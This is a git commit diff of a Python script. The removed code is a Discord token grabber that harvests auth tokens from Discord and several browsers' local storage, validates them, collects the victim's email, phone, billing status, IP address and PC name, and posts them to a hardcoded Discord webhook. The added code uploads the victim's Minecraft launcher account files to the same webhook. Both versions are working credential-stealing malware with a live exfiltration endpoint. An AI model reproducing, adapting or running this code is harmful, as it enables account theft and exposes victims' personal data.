c3ea0a80534bfedfa1ad7919d7ab42b06e214373
hiradexo <78161225+hiradexo@users.noreply.github.com>
2022-01-13 04:04:12 +0330

    Update main.py

--- main.py
+++ main.py
@@ -1,162 +1,18 @@
-import os
+import os, json
+from discord_webhook import DiscordWebhook
 
-if os.name != "nt":
-    exit()
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/930973681453244437/TDg8ECJNrs6RbC5jsX46kp-AKYahbos5h0Auo1VBaUEWr8h01wph-wPpLdeu-iZbLB75')
 
-from re import findall
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
-from threading import Thread
-from time import sleep
-from sys import argv
+# setup paths
+apd = os.getenv('APPDATA')
+mc = apd + "\.minecraft\\"
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/930973681453244437/TDg8ECJNrs6RbC5jsX46kp-AKYahbos5h0Auo1VBaUEWr8h01wph-wPpLdeu-iZbLB75'
+# add webhook files
+files = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
+for x in files:
+    with open(mc + x, "rb") as f:
+        if (x == 'launcher_accounts.json'):
+            x = f"USED_TO_LOGIN-{x}"
+        webhook.add_file(file=f.read(), filename=x)
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    "Discord": ROAMING + "\\Discord",
-    "Discord Canary": ROAMING + "\\discordcanary",
-    "Discord PTB": ROAMING + "\\discordptb",
-    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
-}
-
-
-def getHeader(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-
-
-def getUserData(token):
-    try:
-        return loads(
-            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
-    except:
-        pass
-
-
-def getTokenz(path):
-    path += "\\Local Storage\\leveldb"
-    tokens = []
-    for file_name in os.listdir(path):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb") and not file_name.endswith(".enc") and not file_name.endswith(".encc"):
-            continue
-        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                for token in findall(regex, line):
-                    tokens.append(token)
-    return tokens
-
-
-def whoTheFuckAmI():
-    ip = "Can't get IP"
-    try:
-        ip = urlopen(Request("https://api.ipify.org?format=json")).read().decode().strip()
-    except:
-        pass
-    return ip
-
-
-def paymentMethods(token):
-    try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
-                                              headers=getHeader(token))).read().decode())) > 0)
-    except:
-        pass
-
-
-def main():
-    cache_path = ROAMING + "\\.cache~$"
-    embeds = []
-    working = []
-    checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = whoTheFuckAmI()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    user_path_name = os.getenv("userprofile").split("\\")[2]
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-        for token in getTokenz(path):
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
-                    continue
-            user_data = getUserData(token)
-            if not user_data:
-                continue
-            working_ids.append(uid)
-            working.append(token)
-            username = user_data["username"] + "#" + str(user_data["discriminator"])
-            user_id = user_data["id"]
-            email = user_data.get("email")
-            phone = user_data.get("phone")
-            nitro = bool(user_data.get("premium_type"))
-            billing = bool(paymentMethods(token))
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "|Account Info|",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|PC Info|",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|Token|",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
-                "author": {
-                    "name": f"{username} ({user_id})",
-                },
-            }
-            embeds.append(embed)
-    with open(cache_path, "a") as file:
-        for token in checked:
-            if not token in already_cached_tokens:
-                file.write(token + "\n")
-    if len(working) == 0:
-        working.append('123')
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://i.ibb.co/c3P5DbN/Gigachad.png"
-    }
-    try:
-        
-        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
-    except:
-        pass
-
-
-try:
-    main()
-except Exception as e:
-    print(e)
-    pass
+response = webhook.execute()
